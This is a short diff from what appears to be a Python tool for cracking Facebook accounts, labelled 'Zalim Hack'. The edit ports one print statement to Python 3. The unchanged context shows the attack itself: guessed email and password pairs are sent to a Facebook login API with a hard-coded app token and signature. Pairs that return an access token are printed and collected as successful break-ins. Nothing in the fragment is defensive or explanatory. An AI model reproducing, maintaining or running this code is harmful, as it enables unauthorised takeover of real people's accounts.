@@ -256,7 +256,7 @@ def crack_action():
 			data = br.open("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 			q = json.load(data)
 			if "access_token" in q:
-				print "\x1b[1;92m[Zalim Hack]\x1b[0m " + user + " | " + pass1
+				print ("\x1b[1;92m[Zalim Hack]\x1b[0m " + user + " | " + pass1)
 				oks.append(user+pass1)
 			else:
 				if "www.facebook.com" in q["error_msg"]:
